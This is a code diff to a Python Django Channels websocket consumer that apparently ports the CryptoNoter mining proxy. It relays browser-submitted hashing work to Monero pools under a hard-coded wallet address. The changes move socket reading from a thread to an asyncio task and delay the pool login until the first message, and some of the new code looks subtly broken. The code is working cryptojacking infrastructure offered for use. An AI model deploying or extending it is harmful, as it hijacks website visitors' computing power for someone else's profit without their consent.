@@ -2,6 +2,8 @@ import json, uuid, asyncio
 from channels.generic.websocket import AsyncWebsocketConsumer
 from asgiref.sync import sync_to_async
 
+#'mine.moneropool.com:3333', #
+
 conf = {
     'pool': 'pool.hashvault.pro:80', #'pool.supportxmr.com:3333',
     'addr': '479TNkmiavNLJCd6SRG8b1asxQrgsfBWoSH4qbuJuaxTScTe29qZSJAZooGawjfTCuV1hfcnRvEzP3s3QMqBmCaz8iCeDxw',
@@ -20,8 +22,6 @@ async def connect_pool(self):
     port = int(port)
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((hostname, port))
-#    params = {"login": conf['addr'], "pass": conf['pass'], "agent": 'CryptoNoter'}
-#    self.send(json.dumps({'method':'login', 'params': params}))
     conn = {
         'uid': None,
         'pid': os.urandom(12).hex(),
@@ -32,6 +32,8 @@ async def connect_pool(self):
         'pl': sock
     }
     self.conn = conn
+#    params = {"login": conf['addr'], "pass": conf['pass'], "agent": 'CryptoNoter'}
+#    sock.send(json.dumps({'method':'login', 'params': params}))
     async def on_message(conn, ws, data):
         try:
             conn = self.conn
@@ -51,12 +53,12 @@ async def connect_pool(self):
 
     async def receive(self, conn, sock):
         while self.connected:
-            data = await sock.recv(4096)
+            asyncio.sleep(1)
+            data = await sock.recv(99999)
             print(data)
             await on_message(conn, sock, data)
-    import threading
-    t = threading.Thread(target=receive, args=(self, conn, sock))
-    t.start()
+
+    self.rec_task = asyncio.create_task(receive(self, conn, sock))
 
 async def ws2pool(conn, data):
     buf = None;
@@ -160,15 +162,16 @@ class MiningProxyConsumer(AsyncWebsocketConsumer):
     async def connect(self):
         self.connected = True
         await self.accept()
-        await connect_pool(self)
 
     async def disconnect(self, close_code):
         print('[!] ' + self.conn['uid'] + ' offline.\n')
         if self.conn:
             self.conn['pl'].close()
+        self.rec_task.cancel()
         self.connected = False
 
     async def receive(self, text_data):
+        if not self.conn: await connect_pool(self)
         await ws2pool(self.conn, text_data)
         print('[>] Request: ' + self.conn['uid'] + '\n\n' + text_data + '\n')
 
